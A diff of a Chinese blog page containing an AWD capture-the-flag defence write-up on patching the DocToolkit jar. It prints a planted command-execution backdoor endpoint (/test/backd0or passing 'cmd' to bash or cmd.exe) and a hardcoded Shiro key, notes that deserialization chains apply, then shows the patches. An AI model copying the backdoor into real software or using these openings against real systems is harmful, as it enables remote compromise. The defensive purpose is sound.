@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/favicon.ico">
 <meta property="article:published_time" content="2024-06-07T08:32:42.000Z">
-<meta property="article:modified_time" content="2024-06-07T12:07:35.142Z">
+<meta property="article:modified_time" content="2024-06-07T12:08:02.894Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="awd">
 <meta name="twitter:card" content="summary">
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1717762055142"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1717762082894"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -204,11 +204,11 @@
             <div itemprop="articleBody"><p>以长城杯的DocToolkit修复作为例子，研究一下jvav靶机怎么修的</p>
 <span id="more"></span>
 <p>jadx反编译jar包：</p>
-<img src="/posts/undefined/1.png" class title="awa">
+<img src="/posts/12279/1.png" class title="awa">
 <p>一眼shiro，key都写里面了，是<code>QZIysgMYhG7/CzIJlVpR1g==</code></p>
-<img src="/posts/undefined/2.png" class title="awa">
+<img src="/posts/12279/2.png" class title="awa">
 <p>cc链+cb链都可以用</p>
-<img src="/posts/undefined/3.png" class title="awa">
+<img src="/posts/12279/3.png" class title="awa">
 <p>testcontroller里：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.doctoolkit.controller.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/test&quot;&#125;)</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">/* loaded from: DocToolkit-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/doctoolkit/controller/test/TestController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/backd0or&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">backdoor</span><span class="params">(<span class="meta">@RequestParam(&quot;cmd&quot;)</span> String command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (command == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;).start().getInputStream().read(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>一眼命令执行，可以利用其打一个内存马进去</p>
@@ -218,33 +218,33 @@
 <p>jadx反编译导出class文件(存入resources文件夹中)，java文件(存入source文件夹中)</p>
 <p>找到有问题的文件，此处是<code>ShiroConfig.java</code>和<code>TestController.java</code></p>
 <h2><span id="testcontroller"> TestController</span></h2>
-<img src="/posts/undefined/5.png" class title="awa">
+<img src="/posts/12279/5.png" class title="awa">
 <p>将这个controller放到和BOOT-INF、META-INF同级的目录下</p>
 <p>修改好的源码，修改内容如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.doctoolkit.controller.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/test&quot;&#125;)</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">/* loaded from: DocToolkit-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/doctoolkit/controller/test/TestController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/backd0or&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">backdoor</span><span class="params">(<span class="meta">@RequestParam(&quot;cmd&quot;)</span> String command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (command == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Error: Don&#x27;t hack me!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>编译成class文件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\jdk8u65\bin\javac.exe -extdirs BOOT-INF\lib\ -classpath BOOT-INF\classes\com\example\doctoolkit\controller\test TestController.java</span><br></pre></td></tr></table></figure>
 <p>可以简单理解成<code>-extdirs</code>就是需要的依赖，放在了<code>BOOT-INF\lib\</code>内，-classpath就是我们写idea的时候的<code>package com.xxxx</code></p>
-<img src="/posts/undefined/7.png" class title="awa">
+<img src="/posts/12279/7.png" class title="awa">
 <p>然后替换掉原有的class文件：</p>
-<img src="/posts/undefined/8.png" class title="awa">
+<img src="/posts/12279/8.png" class title="awa">
 <p>打包，需要将原jar包放置同一目录下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\jdk8u65\bin\jar.exe uf .\jar包名字 BOOT-INF\classes\com\example\doctoolkit\controller\test\TestController.class</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/9.png" class title="awa">
+<img src="/posts/12279/9.png" class title="awa">
 <p>重新启动这个jar包，重新查看效果：</p>
-<img src="/posts/undefined/10.png" class title="awa">
+<img src="/posts/12279/10.png" class title="awa">
 <p>可以看到我们已经成功防下来了</p>
 <h2><span id="shiro反序列化"> shiro反序列化</span></h2>
 <p>同样道理，shiro反序列化只需要修改它的key即可</p>
 <p>利用shiro_attack工具生成一个新的随机key</p>
-<img src="/posts/undefined/11.png" class title="awa">
+<img src="/posts/12279/11.png" class title="awa">
 <p>同样的方式，修改<code>com.example.doctoolkit.shiro.shiroConfig.java</code>，将cookie里面的key修改：</p>
 <p>假设选择的key是<code>U7dTFjt/fAozRmr1UaXMuA==</code></p>
-<img src="/posts/undefined/12.png" class title="awa">
+<img src="/posts/12279/12.png" class title="awa">
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RememberMeManager <span class="title function_">cookieRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">CookieRememberMeManager</span> <span class="variable">cookieRememberMeManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CookieRememberMeManager</span>();</span><br><span class="line">        cookieRememberMeManager.setCipherKey(Base64.getDecoder().decode(<span class="string">&quot;U7dTFjt/fAozRmr1UaXMuA==&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> cookieRememberMeManager;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>编译class文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\jdk8u65\bin\javac.exe -extdirs BOOT-INF\lib\ -classpath BOOT-INF\classes\com\example\doctoolkit\shiro ShiroConfig.java</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/13.png" class title="awa">
+<img src="/posts/12279/13.png" class title="awa">
 <p>这个时候报错了，查看报错原因：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误: 找不到符号</span><br></pre></td></tr></table></figure>
 <p>这代表着我们需要多个java文件再编译，通过：</p>
@@ -253,7 +253,7 @@
 <p>覆盖class文件，打包：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\jdk8u65\bin\jar.exe uf DocToolkit-0.0.1-SNAPSHOT.jar BOOT-INF\classes\com\example\doc</span><br><span class="line">toolkit\shiro\ShiroConfig.class</span><br></pre></td></tr></table></figure>
 <p>再次测试，发现原有的key无效了，新的key有效：</p>
-<img src="/posts/undefined/14.png" class title="awa">
+<img src="/posts/12279/14.png" class title="awa">
 </div>
         </div>
         
@@ -345,7 +345,7 @@
                     <a class="tag-none-link" href="/tags/awd/" rel="tag">awd</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-06-07T12:07:35.142Z" itemprop="dateModified">最后编辑：2024-06-07</time>
+                    <time datetime="2024-06-07T12:08:02.894Z" itemprop="dateModified">最后编辑：2024-06-07</time>
                 </div>
             </div>
         </footer>
